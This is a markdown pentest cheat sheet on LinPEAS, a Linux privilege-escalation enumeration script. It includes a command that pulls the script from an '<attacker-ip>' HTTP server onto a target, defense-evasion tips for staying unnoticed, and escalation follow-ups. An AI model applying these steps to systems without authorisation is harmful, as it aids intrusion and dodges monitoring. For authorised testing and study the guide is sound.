
**LinPEAS** (Linux Privilege Escalation Awesome Script) is part of the [PEAS suite](https://github.com/carlospolop/PEASS-ng) and is used to **enumerate potential privilege escalation paths on Linux systems**.

---

## 🧩 What LinPEAS Does

LinPEAS scans for:

- SUID/SGID binaries
- World-writable files and directories
- Misconfigurations in services (cron, PATH, SSH, etc.)
- Kernel and OS info
- Installed software with known vulnerabilities
- Credentials in memory or files
- Docker and LXC misconfigurations
- Capabilities, environment variables, sudo rights
- and much more...

---
## 🚀 Quick Start

### 1. **Download LinPEAS**

From Kali or attacker machine:
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```
or
```
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng/linPEAS
```

## 🖥️ Transfer to Target Machine

### Via Python HTTP Server:
```
# On attacker machine
python3 -m http.server 8080

# On target machine
wget http://<attacker-ip>:8080/linpeas.sh
chmod +x linpeas.sh
```

### 🔍 Running LinPEAS
```
./linpeas.sh
```

Optional colorized output:
```
TERM=xterm ./linpeas.sh
```

Run as root (if escalated already):
```
sudo ./linpeas.sh
```

Run and save output:
```
./linpeas.sh | tee linpeas_output.txt
```

## 🧰 Useful Flags & Tips

|Option|Description|
|---|---|
|`-a`|Run **all** LinPEAS checks|
|`-h`|Help|
|`-s`|Stealth mode (less noisy)|
|`-q`|Quiet mode (minimal output)|
|`-m`|Manual mode (pause at each section)|
## 📂 Output Sections

LinPEAS organizes output by category:

- ✅ **Potential escalation paths** (highlighted in green/yellow/red)
    
- 🔧 **System info:** OS, users, kernel, architecture
    
- 🔒 **Permissions:** SUDO, SUID, SGID, Capabilities
    
- 🔍 **Interesting Files:** Credentials, history, backups
    
- ⚙️ **Cron Jobs:** Writable scripts or misconfigured jobs
    
- 🐚 **Shell Configs:** `.bashrc`, `.profile`, etc.
    
- 🐳 **Docker/LXC:** Container misconfigs
    
- 📡 **Networking:** Open ports, services, and connections

## 🛡️ Defense Evasion Tips

- LinPEAS is noisy. Run during low-visibility windows.
    
- Use `stealth` mode in sensitive environments:
```
./linpeas.sh -s
```

## 🛠️ After LinPEAS

1. Review highlighted sections (especially RED/YELLOW/GREEN)
    
2. Search output for:
    
    - `password`
        
    - `key`
        
    - `root`
        
    - `cap_`
        
    - `docker`
        
3. Consider escalating via:
    
    - Writable scripts (e.g., cron)
        
    - Misconfigured binaries
        
    - Sudo permissions
        
    - Kernel exploits (check kernel version)

## 📚 Related Tools

|Tool|Purpose|
|---|---|
|`pspy`|Monitor running processes|
|`sudo -l`|Check sudo rights|
|`find`|Locate SUID/SGID files|
|`getcap -r / 2>/dev/null`|List file capabilities|
















